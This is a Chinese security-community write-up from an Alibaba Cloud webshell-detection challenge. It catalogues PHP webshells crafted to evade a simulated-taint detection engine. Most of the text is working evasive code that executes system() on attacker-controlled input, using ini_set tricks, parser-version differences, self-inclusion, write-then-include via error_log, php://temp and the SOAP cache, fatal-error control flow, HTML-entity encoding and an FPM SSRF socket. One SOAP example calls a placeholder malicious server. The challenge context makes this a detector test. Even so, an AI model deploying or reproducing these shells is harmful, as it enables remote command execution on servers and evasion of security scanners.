# 第四届阿里云伏魔挑战赛PHP WebShell记录-先知社区

> **来源**: https://xz.aliyun.com/news/17631  
> **文章ID**: 17631

---

伏魔对webshell的检测主要基于模拟污点引擎，虽然介绍中也提到了AI检测和动态沙箱执行检测等其他手段，但测试中感知并不强。模拟污点引擎也是一个类似zend的虚拟机，对AST进行解释执行，从而在比较精确地获取变量值和函数调用链的同时规避动态沙箱对环境依赖及版本碎片化等问题，原理可以参考[WebShell检测之「模拟污点引擎」首次公测，邀你来战！](https://ti.aliyun.com/#/log?id=3)和[模拟执行在恶意文本检测中的最佳实践](https://ti.aliyun.com/#/log?id=27)。

# 动态函数调用

动态调用是PHP webshell最常利用的特性，首先来测试下针对动态调用的检测规则：

以`$a($b)`调用`system`命令执行为例

* `$b`明确为用户可控，此时`$a`在运行过程中的任意时刻（每行代码执行后）都不能包含`system`等敏感函数

* `$b`的值来自`file_get_contents`等返回值不确定的内置函数行为也是一样的
* 如果直接写成`$a($_GET['x'])`这种的话无论$a是啥都是black，估计是直接写了个正则

```
<?php
// black
$a = "aaasystembbb";
$a = "xxxxxx";
$b = $_GET['b'];
$a($b);
```

```
<?php
// black
$a = "aaasys";
$a .= "temxxx";
$b = $_GET['b'];
$a($b);
```

```
<?php
// white
$a = "aaasys";
$a = "temxxx";
$b = $_GET['b'];
$a($b);
```

* `$b`为`"whoami"`等敏感命令，此时对`$a`的每次赋值不允许包含`"system"`，但拼接的话只要最终结果不为`"system"`即可

```
<?php
// black
$a = "system";
$a = "wefwfw";
$b = "whoami";
$a($b);
```

```
<?php
// black
$a = "fwefsystemfwe";
$a = "wefwfw";
$b = "whoami";
$a($b);
```

```
<?php
// white
$a = "aaasys";
$a .= "temxxx";
$b = "whoami";
$a($b);
```

```
<?php
// white
$a = "fwefsystemfwe";
$a .= "wefwfw";
$b = "whoami";
$a($b);
```

* `$b`为其他安全的常量，此时`$a`的值无所谓

```
<?php
// white
$a = "system";
$b = "xxxx";
$a($b);
```

对于诸如 `file_get_contents()` 和 `phpinfo()` 这类返回值不确定的内置函数调用，其返回值会被视为污点值，待遇等同`"system"`字符串。因此，如果想利用动态函数调用，我们需要让引擎获取到一个它认为是确定的安全值，但实际上却是恶意值。

## Parser

php5和php7的语法规则存在一定的差异，有一些语法是不兼容的。如果污点模拟引擎采用的parser只支持某个版本就会存在特定版本的绕过。基于这个思路我去查看了下最常见的[PHP-Parser](https://github.com/nikic/PHP-Parser)对php各版本的支持情况，即使伏魔使用的不是PHP-Parser也可能存在类似的问题（感觉用的应该是魔改版？）。

在<https://github.com/nikic/PHP-Parser/blob/7d3039c37823003d576247868fe755f3d7ec70b8/doc/0_Introduction.markdown> 中可以看到PHP-Parser在对于变量表达式的解析只支持PHP7的规则，测试发现伏魔同样存在这个问题，仅仅按照PHP7的方式进行了求值。

```
<?php
$b = "system";
$foo = "bar";
$bar = ["fwefwe", "world"];

$c = "get_defined_vars";
$foo2 = "car";
$car = ["fwefwe", "world"];
$a = end(current(call_user_func($$foo2[0])));
call_user_func($$foo[0], $a);
```

在PHP7中`$$foo[0]`先获取了`$$foo`的值，然后再访问索引。PHP5中则是先获取了`$foo[0]`，最终获取了`$b`的值。

## ini\_set

伏魔对能够精确求值的内置函数进行了建模（猜测应该是直接调用了这些内置函数进行求值？），但测试发现其中一些内置函数的行为没有考虑ini配置项的影响，通过`ini_set`可以构造出模拟执行和真实执行的差异。

* 通过`ini_set('bcmath.scale', 4);`使得模拟执行引擎无法正确模拟`bcadd`的行为

```
<?php
ini_set('bcmath.scale', 4);
session_start();
$result = bcadd('1.234', '2.456'); // 输出: 3.6900
$decimalPart = explode('.', $result)[1]; // 分割字符串并获取小数部分
$result2 = bcadd('1.234', '2.012'); // 输出: 3.2460
$decimalPart2 = explode('.', $result2)[1]; // 分割字符串并获取小数部分
$x = chr($decimalPart - 6785).chr($decimalPart2 - 2339).chr($decimalPart - 6785).chr($decimalPart - 6784).chr($decimalPart - 6799).chr($decimalPart - 6791);
$y = chr($decimalPart - 6785).chr($decimalPart2 - 2359).str_repeat(chr($decimalPart - 6785),2)."ion_id";
$x($y());
```

* `ini_set`动态将`zend.enable_gc`设置为0，影响`gc_enabled()`的返回值误导模拟执行引擎

```
<?php
ini_set($_GET['a'],0);
$a = var_export(gc_enabled(),true)[0];
$b = gc_enabled();
$t = "xxxx";
$f = $_GET['x'];
$x = "system".$b;
$x($$a);
```

* 伏魔对输出缓冲区中的值也进行了精确的模拟，但没考虑到通过`error_append_string`可以在报错信息中包含`system`

```
<?php
ob_start();

ini_set('display_errors', '1');
ini_set('error_reporting', E_ALL);
ini_set('error_append_string', 'system');

echo "xxxx";
// 触发错误
echo $undefined_variable;

$output = ob_get_clean();

var_dump($output);
substr($output, 138, 6)($_GET['x']);
```

* `arg_separator.output`其实是被考虑到了，但`ini_set($_GET['x'],"st");`这样的形式没有被禁止，此时污点模拟引擎没有模拟出是哪个配置项被设置为了`"st"`

* 不过第一个参数为`$_GET['x']`时伏魔会去检查第二个参数是否可能是某个回调函数，因此像`unserialize_callback_func`没有办法用这种方式利用

```
<?php
ini_set($_GET['x'],"st");
$a = http_build_query(['name' => 'sy', 'em' => 0]);
substr($a,5,6)($_GET['a']);
```

* `precision`和`arg_separator.output`类似，需要用`$_GET['x']`来设置。这会影响`print_r`浮点数部分的结果，输出后再从缓冲区中取出。

```
<?php
ini_set($_GET['x'],5);
$a = $_GET['a'];

ob_start(null, 8);

echo "aaaaaaaa";
echo "a";

$buffer2 = ob_get_contents();

echo "<br>继续输出内容。";

ob_end_flush();

ob_start(null, 8);

echo "11111111";
print_r(4323.9281);

$buffer3 = ob_get_contents();
if (is_numeric($buffer3)) {
    $floatValue = (float)$buffer3;
    $decimalPart2 = ($floatValue - floor($floatValue))*10; // 获取小数部分
} else {
    $decimalPart2 = null; // 如果不是数字，则不能提取小数部分
}

echo "<br>继续输出内容。";

ob_end_flush();

ob_start(null, 8);

echo "11111111";
print_r(1000.3232);

$buffer = ob_get_contents();
if (is_numeric($buffer)) {
    $floatValue = (float)$buffer;
    $decimalPart = ($floatValue - floor($floatValue))*10; // 获取小数部分
} else {
    $decimalPart = null; // 如果不是数字，则不能提取小数部分
}
$x = chr($decimalPart + 113)."ys".chr($decimalPart2 + 108).chr($decimalPart + 99).chr($decimalPart + 107);
$x($$buffer2);

echo "<br>继续输出内容。";

ob_end_flush();
echo "
";
echo $decimalPart;
echo "
";
echo $decimalPart2;
echo "
";
echo $x;
echo "
";
?>
```

* 将pcre.backtrack\_limit设置为较低的值，使得preg\_match正则回溯超过限定次数，`$matches[2]`和`$matches[1]`为空。模拟执行引擎误以为两者为`aaa`和`testing`

```
<?php
ini_set("pcre.backtrack_limit", 10);
session_start();

$text = "aaatesting_GET"."system".str_repeat("a",20);

$pattern = '/(aaa)(.*)(_GET)(system)/'; 

$matches = "a";
preg_match($pattern, $text, $matches);
$x = $matches[2];
$y = $matches[1];

// print_r($matches);
("s".$x."y".$x."s".$x."t".$x."e".$x."m")(("s".$x."e".$x."s".$x."s".$x."i".$x."o".$x."n".$x."_".$x."i".$x."d")());
// echo $f;
```

# 文件包含

相关的限制：

* 对最终包含的路径值有一个类似`^\/tmp\/[\s\S]+$`的正则检测，符合的话就是black，不过并不严格，允许`/tmp`前出现`../`

* `include_path`也有类似限制

```
<?php
// black
include "/tmp/fwefwf";
```

```
<?php
// white
include "/tmp/";
```

```
<?php
// white
include "../../../tmp/fwefw";
```

```
<?php
// black
ini_set("include_path","/tmp");
include "afwefw";
```

```
<?php
// white
ini_set("include_path","../../../tmp");
include "afwefw";
```

* 会检测`sess_`防止包含session文件

```
<?php
// black
include "sess_fw";
```

```
<?php
// black
include "/tmp/xxx/../sess_fw";
```

```
<?php
// white
include "sessfw";
```

```
<?php
// white
include "xsess_fw"; 
```

* 禁止包含`__FILE__`

```
<?php
// black
include __FILE__;
```

# 包含自身

* 尽管`__FILE__`被禁用，但仍然可以直接包含自身文件名制造出模拟执行和真实执行的差异

```
<?php
session_start();
$a++;
if($a < 115)
    include "./include.php"; // 假设文件名是 include.php
else
    (chr($a)."ystem")((chr($a)."ession_id")());
```

# 写文件后包含

污点模拟引擎无法真实模拟文件的写入操作，因此如果能够实现一个内容可控的文件写入 WebShell，就可以包含写入的文件升级为一个完整的webshell。

* 直接`error_log`....

```
<?php
ini_set('log_errors', 'On'); 
ini_set('error_log', 'test.log'); 

error_log($_GET['a']);
include 'test.log';
?>
```

* `RecursiveDirectoryIterator`没有被禁，可以起到类似通配符的效果，直接包含文件上传的临时文件

```
<?php
$directory = "/tmp";

$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));

foreach ($iterator as $file) {
    if ($file->isFile() && strpos($file->getFilename(), 'php') === 0) {
        include_once $file->getPathname(); 
    }
}
?>
```

* 使用`pgsqlCopyToFile`写文件再包含执行

```
<?php

try {
    // 注意：需要实际的数据库连接信息
    $dsn = "pgsql:host=db;dbname=db"; 
    $username = "db";
    $password = "db";

    $pdo = new PDO($dsn, $username, $password);

    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $tableName = "my_table";

    $filename = "./exported_file.csv";

    $delimiter = ",";
    $nullAs = "\N";
    $fields = "id, name, age"; 

    if ($pdo->pgsqlCopyToFile($tableName, $filename, $delimiter, $nullAs, $fields)) { 
        echo "数据成功导出到文件：$filename
";
    } else {
        echo "数据导出失败。
";
    }

} catch (PDOException $e) {
    echo "数据库错误：" . $e->getMessage() . "
";
} catch (Exception $e) {
    echo "其他错误：" . $e->getMessage() . "
";
}
include "./exported_file.csv"; 
```

```
-- 需要在 PostgreSQL 数据库中执行的 SQL
CREATE TABLE my_table (
    id SERIAL PRIMARY KEY,   
    name VARCHAR(100) NOT NULL,  
    age INT                
);

INSERT INTO my_table (name, age) VALUES ('<?php phpinfo();?>', 25); 
```

* 使用`php://temp`写入临时文件，再包含`/proc/self/fd/`获取`system`和`session_id`

```
<?php
$a = "xxxxx";
$b = "xxxxx";
// 创建一个临时流 (maxmemory:1 表示超过1字节就写入系统临时文件)
$tempStream = fopen("php://temp/maxmemory:1", "r+");

fwrite($tempStream, "<?php session_start();\$a = 'system';?>
");
fwrite($tempStream, "<?php \$b = session_id();?>
");

rewind($tempStream);

// 获取临时文件的文件描述符 (fd) - 注意: fd 5 是示例，实际 fd 可能不同
include "/proc/self/fd/5"; 

$a($b); 

fclose($tempStream);
```

* 利用soap缓存写入恶意代码包含执行

* soap缓存文件的命名非常好预测，见<https://github.com/php/php-src/blob/2f1398dad934086b605073c51af3118c8eff28b1/ext/soap/php_sdl.c#L3216>
* 恶意服务器上写一个名为`<`的合法wsdl文件，最终的缓存内容会包含请求的url，也就会带上`<?=system(session_id(session_start()));?>`
* 这个因为SoapClient不是默认安装的扩展被忽略了，不过这个拓展还挺常见的

```
<?php
// 将 WSDL 缓存目录设置为当前目录
ini_set("soap.wsdl_cache_dir", "./"); 
$options = [
    'cache_wsdl' => WSDL_CACHE_DISK, // 使用磁盘缓存
];
// 构造包含恶意代码的 URL 作为 WSDL 地址
$target = "http://<malicious_server>:1234/<?=system(session_id(session_start()));?>"; 
// 创建 SoapClient，这将触发 WSDL 下载和缓存
$client = new SoapClient($target, $options); 
// 计算缓存文件名 (需要知道用户名和 WSDL 版本)
$hash = md5($target);
// 假设用户名为 liontree, wsdl 版本相关前缀为 0f
include "wsdl-liontree-0f$hash"; 
```

# 控制流

对于条件非常量的条件分支语句，污点模拟引擎会确保每个分支都被遍历。对于循环语句，则仅模拟循环次数为常量的情况；当循环次数不确定时，循环中的赋值结果将直接被视为污点值。

```
<?php
// white
if(false)
    $a = $_GET['a']; // 这个分支不会执行
else
    $a = "xxxx"; // $a 被赋值为安全常量
$a("whoami"); // "xxxx"("whoami") 是安全的
```

```
<?php
// black
if(!phpinfo()) // phpinfo() 返回值不确定，两个分支都会被模拟引擎遍历
    $a = $_GET['a']; // 模拟时会认为 $a 可能被污染
else
    $a = "xxxx";
$a("whoami"); // 由于 $a 可能被污染，调用被标记为 black
```

```
<?php
// white
for($i = 0; $i < 10; $i++) { // 循环次数是常量
    $x .= "x"; // $x 的最终值是确定的 "xxxxxxxxxx"
}
$x("whoami"); // "xxxxxxxxxx"("whoami") 是安全的
```

```
<?php
// black
for($i = 0; $i < phpinfo(); $i++) { // 循环次数不确定
    $x .= "x"; // $x 被视为污点值
}
$x("whoami"); // 污点值调用敏感命令，标记为 black
```

* 测试发现污点模拟引擎还存在很强的容错性，即使出现了在真实php中会报出fatal error的语句也会继续执行，可以利用这一特性制造出与真实执行时不同的控制流。

```
<?php
session_start();
register_shutdown_function('shutdownHandler');

function shutdownHandler() {
   global $a;
   global $b;
   global $id;
   echo "shut";
   // 真实执行时，$a = "sys"."tem", $b = "id", $id = session_id()
   // 模拟执行时，由于容错，$a 可能变成 "systemnothing", $b 可能变成 "idfwefwefwef"
   $a($$b); // 真实执行: system($id), 模拟执行可能误判
}

$a = "sys";
$a .= "tem"; // $a = "system"
$id = session_id();
$b = "id"; // $b = "id", $$b 就是 $id

// 访问不存在的常量，真实 PHP 会在此处报 Fatal Error 并停止执行
// 但模拟引擎可能会容错并继续执行下面的语句
echo MyClass::NON_EXISTENT_CONSTANT; 

// 如果模拟引擎继续执行
$b .="fwefwefwef"; // $b 变成 "idfwefwefwef"
$a .= "nothing"; // $a 变成 "systemnothing"

// 脚本正常结束（模拟）或因 Fatal Error 结束（真实），都会调用 shutdownHandler
```

* 类似的通过修改`max_execution_time`来制造fatal error

```
<?php
ini_set("max_execution_time",1); // 设置执行时间为 1 秒
session_start();
register_shutdown_function('shutdownHandler');

function shutdownHandler() {
   global $a;
   global $b;
   global $id;
   echo "shut";
   // 真实执行时，由于超时，$a = "system", $b = "id", $id = session_id()
   // 模拟执行时，可能不会模拟超时，或者模拟方式不同
   $a($$b); // 真实执行: system($id), 模拟执行可能误判
}

$a = "sys";
$a .= "tem"; // $a = "system"
$id = session_id();
$b = "id"; // $b = "id", $$b 就是 $id

// 无限循环，真实 PHP 会在 1 秒后触发 Fatal Error
// 模拟引擎可能不模拟超时，或者直接跳过循环，或者模拟有限次数
while(1) {

}

// 如果模拟引擎没有因超时停止，会执行到这里
$b .="fwefwefwef"; // $b 变成 "idfwefwefwef"
$a .= "nothing"; // $a 变成 "systemnothing"

// 脚本正常结束（模拟）或因超时 Fatal Error 结束（真实），都会调用 shutdownHandler
```

# 其他

* 使用`PDOStatement::debugDumpParams`将带有`"system"`的字符串输入到输出缓冲区中，之后再取出。这个就是伏魔单纯没考虑到`PDOStatement::debugDumpParams`对输出缓冲区的影响。

```
<?php
ob_start(); 
$pdo = new PDO(
    'mysql:host=db;dbname=db;charset=utf8mb4',
    'db',
    'db',
    [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, 
        PDO::ATTR_EMULATE_PREPARES => true           
    ]
);

// 准备一条包含 "system" 字符串的 SQL 语句 (仅用于示例，实际语句可能不同)
$stmt = $pdo->prepare("SELECT * FROM some_table WHERE col = 'system' AND id = :id AND name = ?");

$stmt->bindValue(':id', 42, PDO::PARAM_INT);

$stmt->bindValue(1, 'admin', PDO::PARAM_STR);

// 调试 PDOStatement 的状态，这会将参数信息（包括 'system'）打印到输出缓冲区
echo "Debugging PDOStatement:
";
$stmt->debugDumpParams();

$buffer = ob_get_contents();
ob_end_flush(); 

// 假设 "system" 出现在从索引 48 开始的 6 个字符
// echo substr($buffer,48,6); 
// substr($buffer,48,6)($_GET['x']); 
call_user_func(substr($buffer,48,6),$_GET['x']); // 执行 system($_GET['x'])
```

* 和jsp类似，php其实也支持多种编码，在lexer和parser的代码中很明显可以看到在`zend.multibyte`开启的情况下对编码的各种处理。`zend.multibyte`需要通过`.user.ini`或`.htaccess`打开（php文档写错了说它是`INI_ALL`的，实际上看源码是`INI_PERDIR`的），伏魔也没有禁止写入这两个文件。

```
<?php
// 声明当前脚本使用 HTML 实体编码
// 这需要在文件最开始，并且 zend.multibyte 需要被启用 (通过 .user.ini 或 .htaccess)
declare(encoding='HTML-ENTITIES');
?>
<!-- 下面是 <?php system($_GET['a']); die(1111); ?> 的 HTML 实体编码 -->
&#60;&#63;&#112;&#104;&#112;&#10;&#115;&#121;&#115;&#116;&#101;&#109;&#40;&#36;&#95;&#71;&#69;&#84;&#91;&#39;&#97;&#39;&#93;&#41;&#59;&#10;&#100;&#105;&#101;&#40;&#49;&#49;&#49;&#49;&#41;&#59;&#10;&#63;&#62;
<?php
// 这个 PHP 块用于写入 .user.ini 文件以启用 zend.multibyte
// 这需要在能够写入文件的权限下执行，并且通常需要下一次请求才能生效
$iniFilePath = __DIR__ . '/.user.ini';
$iniContent = "zend.multibyte = 1
";
file_put_contents($iniFilePath, $iniContent);
?>
```

这里的`declare(encoding='HTML-ENTITIES');`效果和直接设置`zend.script_encoding`是类似的，后者印象中很多年前在ctf里就出现过，前者倒似乎没见人提过。

* 可以将真正的恶意代码/命令执行放在其他地方，php仅仅作为一个跳板。比如说fpm环境下可以仅仅构造一个SSRF。除了`curl`外伏魔并没有将网络相关的内置函数作为sink，类似的样本应该还可以写出不少。

```
<?php
$host = '127.0.0.1';
$port = 9000; // 默认 FPM 端口

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

if ($socket === false) {
    echo "创建 socket 失败: " . socket_strerror(socket_last_error()) . "
";
    exit;
}

$result = socket_connect($socket, $host, $port);

if ($result === false) {
    echo "连接失败: " . socket_strerror(socket_last_error($socket)) . "
";
    socket_close($socket);
    exit;
}

$message = urldecode($_GET['x']); 
socket_write($socket, $message, strlen($message));

socket_close($socket);
?>
```
